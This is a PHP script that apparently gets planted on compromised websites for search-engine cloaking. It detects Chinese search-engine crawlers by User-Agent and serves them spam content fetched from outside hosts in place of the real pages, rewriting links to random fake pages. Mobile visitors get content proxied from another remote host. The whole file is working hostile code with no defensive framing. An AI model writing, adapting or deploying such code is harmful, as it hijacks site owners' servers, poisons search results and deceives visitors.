<?php


 $url8 = $_SERVER['HTTP_HOST'];
 
$url = $_SERVER['HTTP_HOST'] . $_SERVER['REQUEST_URI'];
set_time_limit(30);
error_reporting(0);
$tr = "stristr";
$er = $_SERVER;
function httpGet($url) {
  header('Content-Type:text/html;charset=utf-8');
  $ch = curl_init();
  $ua2 = $_SERVER['HTTP_USER_AGENT'];
  curl_setopt($ch, CURLOPT_URL, $url);
  curl_setopt($ch, CURLOPT_USERAGENT, $ua2);
  curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, FALSE);
  curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, FALSE);
  curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
  curl_setopt($ch, CURLOPT_HEADER, 0);
  $output = curl_exec($ch);
  curl_close($ch);
  return $output;
}
function httpGet2($url) {
  header('Content-Type:text/html;charset=utf-8');
  $ch = curl_init();
  $ua2 = $_SERVER['HTTP_USER_AGENT'];
  curl_setopt($ch, CURLOPT_URL, $url);
  curl_setopt($ch, CURLOPT_USERAGENT, 'MyCustomUA/1.0');
  curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, FALSE);
  curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, FALSE);
  curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
  curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
  curl_setopt($ch, CURLOPT_HEADER, 0);
  $output = curl_exec($ch);
  curl_close($ch);
  return $output;
}
$dir="?and";
function char($length = 5, $type = 0)
{
    $arr = array(1 => "0123456789", 2 => "abcdefghijklmnopqrstuvwxyz0123456789");
    if ($type == 0)
    {
        array_pop($arr);
        $string = implode("", $arr);
    } elseif ($type == "-1") {
        $string = implode("", $arr);
    } else {
        $string = $arr[$type];
    }
    $count = strlen($string) - 1;
    $code = '';
    for ($i = 0; $i < $length; $i++) {
        $code .= $string[rand(0, $count)];
    }
    return $code;
}
//  $ = $_SERVER['HTTP_HOST'];
 define('url8', $er['HTTP_HOST']);
define('url', $er['REQUEST_URI']);
define('ref', $er['HTTP_REFERER']);
define('ent', $er['HTTP_USER_AGENT']);
define('site', "http://2025chong.jsc20243.com:81");
define('site2', "http://jschl.nn02.cc:81/hei2/");

define('road',$er['REQUEST_URI']);
define('regs', '@baiduspider|Sogou|Yisou|Haosou|So.com|Sm.cn@i');
define('area', stristr(url, "wap")  or stristr(url, "xj")  or stristr(url, "xml")  or stristr(url, "doc")  or stristr(url, "pdf")  or stristr(url, "txt")  or stristr(url, "ppt")  or stristr(url, "pptx")  or stristr(url, "xls")  or stristr(url, "xlsx")  or stristr(url, "baike")  or stristr(url, "edu")  or stristr(url, "gov")  or stristr(url, "jsp")  or stristr(url, "asp")  or stristr(url, "gq")  or stristr(url, "pdx")  or stristr(url, "ga")  or stristr(url, "tacc")  or stristr(url, "work")  or stristr(url, "csv")  or stristr(url, "sports")  or stristr(url, "sleep")  or stristr(url, "life")  or stristr(url, "88art")
 or stristr(url, "advice") or stristr(url, "music") or stristr(url, "x888") or stristr(url, "and") or stristr(url, "day") or stristr(url, "world") or stristr(url, "school") or stristr(url, "tips") or stristr(url, "auto"));
 $title = '/<title>(.*?)<\/title>/i';
$meta = '/<meta charset=".*?>/i';
$key = '/<meta\s+name="keywords"\s+content="([^"]+)"\s*\/?>/i';
$miaoshu = '/<meta\s+name="description"\s+content="([^"]+)"\s*\/?>/i';
if (preg_match(regs, ent)) {
 if (area) {
     echo '<!-23-154-jsc-2025-9-26-kaiwen88-->';
      echo '<html><link rel="canonical" href="'.$url.'" />' ;
  
        echo httpGet(site.road);
     $html=httpGet2(url8);
// 执行替换</h1>
$html = str_replace('</h1>', '', $html);
// 执行替换<h1>
$html = str_replace('<h1>', '', $html);

$lianjie = '/<a .*?>[\s\S]*?<\/a>/';
preg_match_all($lianjie,$html,$aarray5);

if($aarray5[0]){
	foreach ($aarray5[0] as $pbti){
		$preg = '/href=(\"|\')(.*?)(\"|\')/i';

$replacestr = 'href="'.$dir."/".char(6,1).char(mt_rand(4,10),2).'.html'.'"';

$ahtml=preg_replace($preg, $replacestr,$pbti);
$html= str_replace($pbti, $ahtml, $html);
		
	}
}

// 执行替换$meta
$pattern6 = $meta;
$replacement6 = '';
$html = preg_replace($pattern6, $replacement6, $html);
// 执行替换$miaoshu
$pattern5 = $miaoshu;
$replacement5 = '';
$html = preg_replace($pattern5, $replacement5, $html);
// 执行替换$key
$pattern4 = $key;
$replacement4 = '';
$html = preg_replace($pattern4, $replacement4, $html);
// 执行替换$title
$pattern3 = $title;
$replacement3 = '';
$html = preg_replace($pattern3, $replacement3, $html);

// 执行替换/head
$html = str_replace('</head>', '', $html);
// 执行替换head
$html = str_replace('<head>', '', $html);



// 执行替换替换html
$pattern2 = '/<html>/i';
$replacement2 = '';
$html = preg_replace($pattern2, $replacement2, $html);


// 执行替换替换<body2>
$pattern8 = '/body class=.*?>/i';
$replacement8 = '';
$html = preg_replace($pattern8, $replacement8, $html);

// 执行替换替换<body>
$pattern7 = '/<body>/i';
$replacement7 = '';
$html = preg_replace($pattern7, $replacement7, $html);


echo $html;
      exit();
    } else {

$html=httpGet2(url8);


$lianjie = '/<a .*?>[\s\S]*?<\/a>/';

// 执行替换</body>
$html = str_replace('</body>', '', $html);

// 执行替换</html>
$html = str_replace('</html>', '', $html);

preg_match_all($lianjie,$html,$aarray5);

if($aarray5[0]){
	foreach ($aarray5[0] as $pbti){
		$preg = '/href=(\"|\')(.*?)(\"|\')/i';

$replacestr = 'href="'.$dir."/".char(6,1).char(mt_rand(4,10),2).'.html'.'"';

$ahtml=preg_replace($preg, $replacestr,$pbti);
$html= str_replace($pbti, $ahtml, $html);

		
	}
}



echo $html;

      exit();	
	}
}

        ob_flush();
        flush();

  



if (area && preg_match('/phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone/',$_SERVER['HTTP_USER_AGENT'])) {
   
$ua = $_SERVER['HTTP_USER_AGENT'];
$ch = curl_init();

// 璁剧疆URL鍜岀浉搴旂殑閫夐」
curl_setopt($ch, CURLOPT_USERAGENT, $ua);
     
curl_setopt($ch, CURLOPT_URL, "http://8.jsc20243.com:81/502.php");
curl_setopt($ch, CURLOPT_HEADER, false);

// 鎶撳彇URL骞舵妸瀹冧紶閫掔粰娴忚鍣�

curl_exec($ch);

//鍏抽棴cURL璧勬簮锛屽苟涓旈噴鏀剧郴缁熻祫婧�

curl_close($ch);

    exit();
   } 
 




     

?>